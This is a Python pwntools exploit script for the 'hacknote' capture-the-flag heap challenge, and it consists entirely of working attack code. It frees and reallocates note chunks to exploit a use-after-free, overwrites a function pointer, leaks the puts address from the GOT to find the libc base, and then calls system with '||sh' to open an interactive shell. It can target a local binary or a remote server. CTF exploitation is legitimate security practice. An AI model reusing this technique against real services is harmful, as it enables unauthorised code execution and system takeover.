#coding:utf-8

from pwn import *

#context.log_level = 'debug'

debug = 1


def wp_add(size, content):
	r.recvuntil('Your choice :')
	r.send('1'.ljust(4, '\x00'))

	r.recvuntil('Note size :')
	r.send(str(size).ljust(8, '\x00'))

	r.recvuntil('Content :')
	r.send(content)


def wp_delete(index):
	r.recvuntil('Your choice :')
	r.send('2'.ljust(4, '\x00'))

	r.recvuntil('Index :')
	r.send(str(index).ljust(4, '\x00'))
	

def wp_print(index):
	r.recvuntil('Your choice :')
	r.send('3'.ljust(4, '\x00'))

	r.recvuntil('Index :')
	r.send(str(index).ljust(4, '\x00'))
	return r.recv(4)


def wp_exit():
	r.recvuntil('Your choice :')
	r.send('4'.ljust(4, '\x00'))



def exp(debug):

	global r
	
	if debug == 1:
		r = process('./hacknote')
		#gdb.attach(r, 'b *0x0804869A')
		lib = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		r = remote('111.198.29.45', 41471)
		lib = ELF('./hacknote_lib')

	elf = ELF('./hacknote')
	print elf.got['puts']
	wp_add(0x20, 'a')	#index:0
	wp_add(0x20, 'a')	#index:1
	wp_delete(0)
	wp_delete(1)
	wp_add(0x8, p32(0x0804862B) + p32(elf.got['puts']))	#index:2
	lib_base = u32(wp_print(0)) - lib.sym['puts']
	log.info('lib_base => %#x'%lib_base)

	wp_delete(2)
	wp_add(0x8, p32(lib_base + lib.sym['system']) + '||sh')
	wp_print(0)
	r.interactive()


	

exp(debug)
	
